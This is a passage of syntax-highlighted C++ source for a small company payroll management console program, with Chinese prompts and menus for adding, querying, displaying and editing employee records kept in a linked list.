class="line">	cin &gt;&gt; Id;</span><br><span class="line">	id = <span class="built_in">Ide</span>(Id);</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;请输入员工姓名：&quot;</span>;</span><br><span class="line">	cin &gt;&gt; name;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;请输入员工性别【男|女】：&quot;</span>;</span><br><span class="line">	cin &gt;&gt; gender;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;请输入员工部门【销售部、技术部、人事部】：&quot;</span>;</span><br><span class="line">	cin &gt;&gt; department;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;请输入员工级别【初级、中级、高级】：&quot;</span>;</span><br><span class="line">	cin &gt;&gt; level;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*派生类工资计算函数*/</span></span><br><span class="line"><span class="function"><span class="type">double</span> <span class="title">Manager::calculateSalary</span><span class="params">()</span><span class="type">const</span> </span>&#123;</span><br><span class="line">	<span class="keyword">return</span> MonthSalary;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">double</span> <span class="title">Salesperson::calculateSalary</span><span class="params">()</span> <span class="type">const</span> </span>&#123;</span><br><span class="line">	<span class="keyword">return</span> SalesAmount * commision;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">double</span> <span class="title">SalesManager::calculateSalary</span><span class="params">()</span> <span class="type">const</span> </span>&#123;</span><br><span class="line">	<span class="keyword">return</span> (SalesAmount * commision) + MonthSalary;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">double</span> <span class="title">Technician::calculateSalary</span><span class="params">()</span><span class="type">const</span> </span>&#123;</span><br><span class="line">	<span class="keyword">return</span> hourlyWage * time;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//Employees功能函数</span></span><br><span class="line"><span class="function"><span class="type">double</span> <span class="title">Employees::calculateSalary</span><span class="params">()</span><span class="type">const</span> </span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (type == <span class="string">&quot;经理&quot;</span>) &#123;</span><br><span class="line">		<span class="keyword">return</span> Manager::<span class="built_in">calculateSalary</span>();</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (type == <span class="string">&quot;销售人员&quot;</span>) &#123;</span><br><span class="line">		<span class="keyword">return</span> Salesperson::<span class="built_in">calculateSalary</span>();</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (type == <span class="string">&quot;销售经理&quot;</span>) &#123;</span><br><span class="line">		<span class="keyword">return</span> SalesManager::<span class="built_in">calculateSalary</span>();</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (type == <span class="string">&quot;技术人员&quot;</span>) &#123;</span><br><span class="line">		<span class="keyword">return</span> Technician::<span class="built_in">calculateSalary</span>();</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Employees::showEmployees</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;\t&quot;</span> &lt;&lt; id &lt;&lt; <span class="string">&quot;\t\t&quot;</span> &lt;&lt; name &lt;&lt; <span class="string">&quot;\t\t&quot;</span> &lt;&lt; gender &lt;&lt; <span class="string">&quot;\t\t&quot;</span> &lt;&lt; department &lt;&lt; <span class="string">&quot;\t\t&quot;</span> &lt;&lt; level &lt;&lt; <span class="string">&quot;\t\t&quot;</span> &lt;&lt; Salary &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Employees::modifyname</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;请输入需要修改的姓名：&quot;</span>;</span><br><span class="line">	cin &gt;&gt; name;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span>  <span class="title">Employees::modifygender</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	cin &gt;&gt; gender;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;请输入需要修改的性别：&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span>  <span class="title">Employees::modifydepartment</span><span class="params">()</span></span>&#123;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;请输入需要调换的部门：&quot;</span>;</span><br><span class="line">	cin &gt;&gt; department;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span>  <span class="title">Employees::modifylevel</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;请输入需要更新的级别：&quot;</span>;</span><br><span class="line">	cin &gt;&gt; level;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span>  <span class="title">Employees::modifysalary</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;请输入修改后工资：&quot;</span>;</span><br><span class="line">	cin &gt;&gt; Salary;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//Employees保存函数</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Employees::saveid</span><span class="params">( <span class="type">int</span> Id)</span> </span>&#123;</span><br><span class="line">	id = Id;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span>  <span class="title">Employees::savename</span><span class="params">(string Name)</span> </span>&#123;</span><br><span class="line">	name = Name;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Employees::savegender</span><span class="params">(string Gender)</span> </span>&#123;</span><br><span class="line">	gender = Gender;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Employees::savedepartment</span><span class="params">(string Department)</span> </span>&#123;</span><br><span class="line">	department = Department;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Employees::savelevel</span><span class="params">(string Level)</span> </span>&#123;</span><br><span class="line">	level = Level;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Employees::savesalary</span><span class="params">(<span class="type">double</span> salary)</span> </span>&#123;</span><br><span class="line">	Salary = salary;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*功能函数*/</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">listlength</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="type">int</span> length=<span class="number">0</span>;</span><br><span class="line">	Linklist current = head-&gt;next;</span><br><span class="line">	<span class="keyword">while</span> (current != <span class="literal">NULL</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		length++;</span><br><span class="line">		current = current-&gt;next;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> length;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">init_list</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	head = <span class="keyword">new</span> Node;</span><br><span class="line">	head-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">clear_buffer</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="type">char</span> ch;</span><br><span class="line">	<span class="keyword">while</span> ((ch = <span class="built_in">getchar</span>()) != <span class="string">&#x27;\n&#x27;</span> &amp;&amp; ch != EOF);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">menu</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="type">char</span> choose;</span><br><span class="line">	<span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;\t\t\t\t╔═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═╗&quot;</span> &lt;&lt; endl;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;\t\t\t\t‖                                               ‖&quot;</span> &lt;&lt; endl;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;\t\t\t\t‖          &lt;小型公司工资管理系统设计&gt;           ‖&quot;</span> &lt;&lt; endl;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;\t\t\t\t‖                                               ‖&quot;</span> &lt;&lt; endl;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;\t\t\t\t‖              1.  添加职工信息                 ‖&quot;</span> &lt;&lt; endl;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;\t\t\t\t‖              2.  查询职工信息                 ‖&quot;</span> &lt;&lt; endl;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;\t\t\t\t‖              3.  显示职工信息                 ‖&quot;</span> &lt;&lt; endl;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;\t\t\t\t‖              4.  编辑职工信息                 ‖&quot;</span> &lt;&lt; endl;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;\t\t\t\t‖              5.  删除职工信息                 ‖&quot;</span> &lt;&lt; endl;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;\t\t\t\t‖              6.  统计职工信息                 ‖&quot;</span> &lt;&lt; endl;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;\t\t\t\t‖              7.  保存职工信息                 ‖&quot;</span> &lt;&lt; endl;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;\t\t\t\t‖              8.  读取职工信息                 ‖&quot;</span> &lt;&lt; endl;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;\t\t\t\t‖              0.  结束进程                     ‖&quot;</span> &lt;&lt; endl;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;\t\t\t\t‖                                               ‖&quot;</span> &lt;&lt; endl;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;\t\t\t\t‖                                               ‖&quot;</span> &lt;&lt; endl;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;\t\t\t\t‖                                               ‖&quot;</span> &lt;&lt; endl;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;\t\t\t\t‖                                               ‖&quot;</span> &lt;&lt; endl;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;\t\t\t\t╚═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═╝&quot;</span> &lt;&lt; endl;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;\t\t\t\t请输入数字执行对应的功能:&quot;</span>;</span><br><span class="line">		choose = <span class="built_in">getchar</span>();</span><br><span class="line">		<span class="built_in">clear_buffer</span>();</span><br><span class="line">		<span class="keyword">switch</span> (choose)</span><br><span class="line">		&#123;</span><br><span class="line">		<span class="keyword">case</span> <span class="string">&#x27;1&#x27;</span>: &#123;<span class="comment">//添加职员信息</span></span><br><span class="line">			<span class="built_in">system</span>(<span class="string">&quot;CLS&quot;</span>);</span><br><span class="line">			<span class="built_in">add_employee</span>();</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">case</span> <span class="string">&#x27;2&#x27;</span>: &#123;<span class="comment">//查询职工信息</span></span><br><span class="line">			<span class="built_in">system</span>(<span class="string">&quot;CLS&quot;</span>);</span><br><span class="line">			<span class="built_in">query_employee</span>();</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">case</span> <span class="string">&#x27;3&#x27;</span>: &#123;<span class="comment">//显示职工信息</span></span><br><span class="line">			<span class="built_in">system</span>(<span class="string">&quot;CLS&quot;</span>);</span><br><span class="line">			<span class="built_in">display_all</span>();</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">case</span> <span class="string">&#x27;4&#x27;</span>: &#123;<span class="comment">//编辑员工信息</span></span><br><span class="line">			<span class="built_in">system</span>(<span class="string">&quot;CLS&quot;</span>);</span><br><span class="line">			<span class="built_in">modify_employee</span>();</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">case</span> <span class="string">&#x27;5&#x27;</span>: &#123;<span class="comment">//删除员工信息</span></span><br><span class="line">			<span class="built_in">delete_employee</span>();</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">case</span> <span class="string">&#x27;6&#x27;</span>: &#123;<span class="comment">//统计员工信息</span></span><br><span class="line">			<span class="built_in">system</span>(<span class="string">&quot;CLS&quot;</span>);</span><br><span class="line">			<span class="built_in">static_employee</span>();</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">case</span> <span class="string">&#x27;7&#x27;</span>: &#123;<span class="comment">//保存员工信息</span></span><br><span class="line">			<span class="built_in">save</span>();</span><br><span class="line">			cout &lt;&lt; <span class="string">&quot;\t\t\t\t保存成功！&quot;</span>&lt;&lt;endl;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">case</span> <span class="string">&#x27;8&#x27;</span>: &#123;<span class="comment">//读取员工信息</span></span><br><span class="line">			cout &lt;&lt; <span class="string">&quot;读取成功！&quot;</span>&lt;&lt;endl;</span><br><span class="line">			<span class="built_in">load</span>();</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">case</span> <span class="string">&#x27;0&#x27;</span>: &#123;<span class="comment">//退出</span></span><br><span class="line">			cout &lt;&lt; <span class="string">&quot;\t\t\t\t**********退出成功！**********&quot;</span> &lt;&lt; endl;</span><br><span class="line">			<span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">default</span>:</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="built_in">clear_buffer</span>();</span><br><span class="line">		<span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">		<span class="built_in">system</span>(<span class="string">&quot;cls&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">Ide</span><span class="params">(<span class="type">int</span> Id)</span></span>&#123;</span><br><span class="line">	Linklist temp = head-&gt;next;</span><br><span class="line">	<span class="keyword">while</span> (temp != <span class="literal">NULL</span>) </span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span>(temp-&gt;e.<span class="built_in">getId</span>() == Id)</span><br><span class="line">		&#123;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;该编号已存在！请重新输入：&quot;</span> &lt;&lt; endl;</span><br><span class="line">		cin &gt;&gt; Id;</span><br><span class="line">		&#125;</span><br><span class="line">		temp = temp-&gt;next;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> Id;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">add_employee</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="type">char</span> choose;</span><br><span class="line">	Linklist current, newNode = <span class="keyword">new</span> Node;</span><br><span class="line">	newNode-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">	&#123;<span class="comment">//添加职工信息</span></span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;\t\t\t\t╔═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═╗&quot;</span> &lt;&lt; endl;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;\t\t\t\t‖                                               ‖&quot;</span> &lt;&lt; endl;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;\t\t\t\t‖                ****人员类型****               ‖&quot;</span> &lt;&lt; endl;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;\t\t\t\t‖                1、经理                        ‖&quot;</span> &lt;&lt; endl;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;\t\t\t\t‖                2、销售人员                    ‖&quot;</span> &lt;&lt; endl;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;\t\t\t\t‖                3、销售经理                    ‖&quot;</span> &lt;&lt; endl;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;\t\t\t\t‖                4、技术人员                    ‖&quot;</span> &lt;&lt; endl;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;\t\t\t\t‖                0、返回主菜单                  ‖&quot;</span> &lt;&lt; endl;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;\t\t\t\t‖                                               ‖&quot;</span> &lt;&lt; endl;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;\t\t\t\t╚═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═╝&quot;</span> &lt;&lt; endl;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;\t\t\t\t请输入数字选择需要添加的人员类型:&quot;</span>;</span><br><span class="line">		choose = <span class="built_in">getchar</span>();</span><br><span class="line">		<span class="built_in">clear_buffer</span>();</span><br><span class="line">		<span class="built_in">system</span>(<span class="string">&quot;CLS&quot;</span>);</span><br><span class="line">		<span class="keyword">switch</span> (choose) &#123;</span><br><span class="line">			<span class="keyword">case</span> <span class="string">&#x27;1&#x27;</span>: &#123;<span class="comment">//添加经理</span></span><br><span class="line">				newNode-&gt;e.<span class="built_in">addmanager</span>();</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">case</span> <span class="string">&#x27;2&#x27;</span>: &#123;<span class="comment">//添加销售人员</span></span><br><span class="line">				newNode-&gt;e.<span class="built_in">addsalesperson</span>();</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">case</span> <span class="string">&#x27;3&#x27;</span>: &#123;<span class="comment">//添加销售经理</span></span><br><span class="line">				newNode-&gt;e.<span class="built_in">addsalesmanager</span>();</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">case</span> <span class="string">&#x27;4&#x27;</span>: &#123;<span class="comment">//添加技术人员</span></span><br><span class="line">				newNode-&gt;e.<span class="built_in">addtechnician</span>();</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">case</span> <span class="string">&#x27;0&#x27;</span>:<span class="keyword">break</span>;</span><br><span class="line">			<span class="keyword">default</span>: &#123;</span><br><span class="line">				cout &lt;&lt; <span class="string">&quot;无效的选择！\n&quot;</span>;</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">while</span> (<span class="literal">true</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span> (head-&gt;next == <span class="literal">NULL</span>) &#123;</span><br><span class="line">			head-&gt;next = newNode;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span> &#123;</span><br><span class="line">			current = head-&gt;next;</span><br><span class="line">			<span class="keyword">while</span> (current-&gt;next != <span class="literal">NULL</span>)</span><br><span class="line">			&#123;</span><br><span class="line">				current = current-&gt;next;</span><br><span class="line">			&#125;</span><br><span class="line">			current-&gt;next = newNode;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">save</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">query_employee</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="type">int</span> queryid;</span><br><span class="line">	string queryname;</span><br><span class="line">	<span class="type">bool</span> flag = <span class="literal">false</span>;</span><br><span class="line">	<span class="type">char</span> input = <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">	Linklist current = head-&gt;next;</span><br><span class="line">	<span class="built_in">system</span>(<span class="string">&quot;CLS&quot;</span>);</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;\t\t\t\t╔═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═╗&quot;</span> &lt;&lt; endl;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;\t\t\t\t‖                                               ‖&quot;</span> &lt;&lt; endl;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;\t\t\t\t‖       ****公司员工工资信息查询系统****        ‖&quot;</span> &lt;&lt; endl;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;\t\t\t\t‖            请选择您的查询方式                 ‖&quot;</span> &lt;&lt; endl;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;\t\t\t\t‖                1、编号查询                    ‖&quot;</span> &lt;&lt; endl;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;\t\t\t\t‖                2、姓名查询                    ‖&quot;</span> &lt;&lt; endl;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;\t\t\t\t‖                0、返回主菜单                  ‖&quot;</span> &lt;&lt; endl;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;\t\t\t\t‖                                               ‖&quot;</span> &lt;&lt; endl;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;\t\t\t\t╚═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═╝&quot;</span> &lt;&lt; endl;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;\t\t\t\t请输入数字选择查询的方式:&quot;</span>;</span><br><span class="line">	cin &gt;&gt; input;</span><br><span class="line">	<span class="built_in">clear_buffer</span>();</span><br><span class="line">	<span class="keyword">if</span> (input == <span class="string">&#x27;1&#x27;</span>) &#123;<span class="comment">//按编号查询</span></span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;\t\t\t\t请输入需要查询的员工编号:&quot;</span>;</span><br><span class="line">		cin &gt;&gt; queryid;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;\t========================================================================================&quot;</span> &lt;&lt; endl;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;\t&quot;</span> &lt;&lt; <span class="string">&quot;编号&quot;</span> &lt;&lt; <span class="string">&quot;\t\t&quot;</span> &lt;&lt; <span class="string">&quot;姓名&quot;</span> &lt;&lt; <span class="string">&quot;\t\t&quot;</span> &lt;&lt; <span class="string">&quot;性别&quot;</span> &lt;&lt; <span class="string">&quot;\t\t&quot;</span> &lt;&lt; <span class="string">&quot;部门&quot;</span> &lt;&lt; <span class="string">&quot;\t\t&quot;</span> &lt;&lt; <span class="string">&quot;级别&quot;</span> &lt;&lt; <span class="string">&quot;\t\t&quot;</span> &lt;&lt; <span class="string">&quot;工资&quot;</span> &lt;&lt; endl;</span><br><span class="line">		<span class="keyword">while</span> (current != <span class="literal">NULL</span>) &#123;</span><br><span class="line">			<span class="keyword">if</span> (current-&gt;e.<span class="built_in">getId</span>() == queryid) &#123;</span><br><span class="line">				current-&gt;e.<span class="built_in">showEmployees</span>();</span><br><span class="line">				flag = <span class="literal">true</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			current = current-&gt;next;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span> (flag == <span class="literal">false</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			cout &lt;&lt; <span class="string">&quot;\t未能查询到该编号！&quot;</span> &lt;&lt; endl;</span><br><span class="line">		&#125;</span><br><span class="line">		cout &lt;&lt; endl;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">if</span> (input == <span class="string">&#x27;2&#x27;</span>) &#123;<span class="comment">//按姓名查询</span></span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;\t\t\t\t请输入需要查询的员工姓名:&quot;</span>;</span><br><span class="line">		cin &gt;&gt; queryname;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;\t========================================================================================&quot;</span> &lt;&lt; endl;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;\t&quot;</span> &lt;&lt; <span class="string">&quot;编号&quot;</span> &lt;&lt; <span class="string">&quot;\t\t&quot;</span> &lt;&lt; <span class="string">&quot;姓名&quot;</span> &lt;&lt; <span class="string">&quot;\t\t&quot;</span> &lt;&lt; <span class="string">&quot;性别&quot;</span> &lt;&lt; <span class="string">&quot;\t\t&quot;</span> &lt;&lt; <span class="string">&quot;部门&quot;</span> &lt;&lt; <span class="string">&quot;\t\t&quot;</span> &lt;&lt; <span class="string">&quot;级别&quot;</span> &lt;&lt; <span class="string">&quot;\t\t&quot;</span> &lt;&lt; <span class="string">&quot;工资&quot;</span> &lt;&lt; endl;</span><br><span class="line">		<span class="keyword">while</span> (current != <span class="literal">NULL</span>) &#123;</span><br><span class="line">			<span class="keyword">if</span> (current-&gt;e.<span class="built_in">getname</span>() == queryname) &#123;</span><br><span class="line">				current-&gt;e.<span class="built_in">showEmployees</span>();</span><br><span class="line">				flag = <span class="literal">true</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			current = current-&gt;next;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span> (flag == <span class="literal">false</span>) &#123;</span><br><span class="line">			cout &lt;&lt; <span class="string">&quot;\t未能查询到该员工！&quot;</span> &lt;&lt; endl;</span><br><span class="line">		&#125;</span><br><span class="line">		cout &lt;&lt; endl;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">if</span> (input == <span class="string">&#x27;0&#x27;</span>);</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;\t\t\t\t无效的选择！&quot;</span> &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">display_all</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	Linklist current = head-&gt;next;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;\t\t\t\t************员工信息展示************&quot;</span> &lt;&lt; endl;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;\t==================================================================================================&quot;</span> &lt;&lt; endl;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;\t&quot;</span> &lt;&lt; <span class="string">&quot;编号&quot;</span> &lt;&lt; <span class="string">&quot;\t\t&quot;</span> &lt;&lt; <span class="string">&quot;姓名&quot;</span> &lt;&lt; <span class="string">&quot;\t\t&quot;</span> &lt;&lt; <span class="string">&quot;性别&quot;</span> &lt;&lt; <span class="string">&quot;\t\t&quot;</span> &lt;&lt; <span class="string">&quot;部门&quot;</span> &lt;&lt; <span class="string">&quot;\t\t&quot;</span> &lt;&lt; <span class="string">&quot;级别&quot;</span> &lt;&lt; <span class="string">&quot;\t\t&quot;</span> &lt;&lt; <span class="string">&quot;工资&quot;</span> &lt;&lt; endl;</span><br><span class="line">	<span class="keyword">while</span> (current != <span class="literal">NULL</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		current-&gt;e.<span class="built_in">showEmployees</span>();</span><br><span class="line">		current = current-&gt;next;</span><br><span class="line">	&#125;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;\t===========================================END=====================================================&quot;</span> &lt;&lt; endl;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;\t&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">modify_employee</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="type">int</span> modifyid;</span><br><span class="line">	<span class="type">bool</span> flag = <span class="literal">false</span>;</span><br><span class="line">	<span class="type">char</span> item;</span><br><span class="line">	Linklist current = head-&gt;next;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;请输入需要修改的员工编号：&quot;</span>;</span><br><span class="line">	cin &gt;&gt; modifyid;</span><br><span class="line">	<span class="keyword">while</span> (current != <span class="literal">NULL</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span> (current-&gt;e.<span class="built_in">getId</span>() == modifyid) &#123;</span><br><span class="line">			current-&gt;e.<span class="built_in">showEmployees</span>();</span><br><span class="line">			cout &lt;&lt; <span class="string">&quot;请输入需要修改的项目的序号【1-姓名|2-性别|3-部门|4-级别|5-工资】:&quot;</span>;</span><br><span class="line">			cin &gt;&gt; item;</span><br><span class="line">			<span class="built_in">clear_buffer</span>();</span><br><span class="line">			<span class="keyword">switch</span> (item) &#123;</span><br><span class="line">			<span class="keyword">case</span> <span class="string">&#x27;1&#x27;</span>: current-&gt;e.<span class="built_in">modifyname</span>(); <span class="keyword">break</span>;</span><br><span class="line">			<span class="keyword">case</span> <span class="string">&#x27;2&#x27;</span>:current-&gt;e.<span class="built_in">modifygender</span>(); <span class="keyword">break</span>;</span><br><span class="line">			<span class="keyword">case</span> <span class="string">&#x27;3&#x27;</span>:current-&gt;e.<span class="built_in">modifydepartment</span>(); <span class="keyword">break</span>;</span><br><span class="line">			<span class="keyword">case</span> <span class="string">&#x27;4&#x27;</span>:current-&gt;e.<span class="built_in">modifylevel</span>(); <span class="keyword">break</span>;</span><br><span class="line">			<span class="keyword">case</span> <span 